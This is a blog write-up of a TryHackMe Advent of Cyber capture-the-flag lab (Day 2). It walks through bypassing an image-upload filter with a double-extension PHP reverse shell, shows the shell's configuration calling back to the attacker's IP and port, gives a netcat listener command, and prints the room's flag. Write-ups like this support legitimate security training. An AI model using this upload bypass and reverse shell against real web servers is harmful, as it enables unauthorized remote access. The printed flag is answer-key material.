---
title: AdventOfCyber2 Day 2
template: "post"
date: "2020-12-02"
draft: false
category: "Write-Ups, AdventOfCyber2"
tags:
  - "TryHackMe, AdventOfCyber2"
  - "Python"
social-image: "/media/adventOfCyber2/icon.png"
description: "It's a write-up about the room : [Try Hack Me - Room : AdventOfCyber2](https://tryhackme.com/room/adventofcyber2)"
---

It's a write-up about the room : [Try Hack Me - Room : AdventOfCyber2](https://tryhackme.com/room/adventofcyber2)

# Day 2 : The Elf Strikes Back !

```
At the bottom of the dossier is a sticky note containing the following 
message:

    For Elf McEager:
    You have been assigned an ID number for your audit of the system: 
	ODIzODI5MTNiYmYw . Use this to gain access to the upload section of 
	the site.
    Good luck!
```

We deploy the machine, obtain the IP address : `10.10.4.190`

## What string of text needs adding to the URL to get access to the upload page?

We navigate tot the displayed IP address inn our browser and access to the upload page by adding this string to the URL : 
`/?id=ODIzODI5MTNiYmYw` because our ID is ODIzODI5MTNiYmYw.

## What type of file is accepted by the site? 
`<input type="file" id="chooseFile" accept=".jpeg,.jpg,.png">`
**image**

## Now we have to bypass the filter and upload a reverse shell.

* In which directory are the uploaded files stored?

We use the file **php-reverse-shell.php** and rename it **php-reverse-shell.jpeg.php**.
In this one, we put our IP OpenVPN address and the port where we want to listen : 
```
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.8.87.25';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

We submit it in the website, and go on `http://10.10.4.190/uploads/` and find our file.  
So the uploaded files are stored in **/uploads/**.

## What is the flag in /var/www/flag.txt?

We listen our port with the command : `sudo nc -lvnp 443`
We launch our file in the directory `/uploads/` on the website. 
We can now execute shell command, so we do that below to find the flag : 

```
sh-4.4$ cat /var/www/flag.txt  
cat /var/www/flag.txt


==============================================================


You've reached the end of the Advent of Cyber, Day 2 -- hopefully you're enjoying yourself so far, and are learning lots! 
This is all from me, so I'm going to take the chance to thank the awesome @Vargnaar for his invaluable design lessons, without which the theming of the past two websites simply would not be the same. 


Have a flag -- you deserve it!
THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}


Good luck on your mission (and maybe I'll see y'all again on Christmas Eve)!
 --Muiri (@MuirlandOracle)


==============================================================
```

The flag is **THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}**.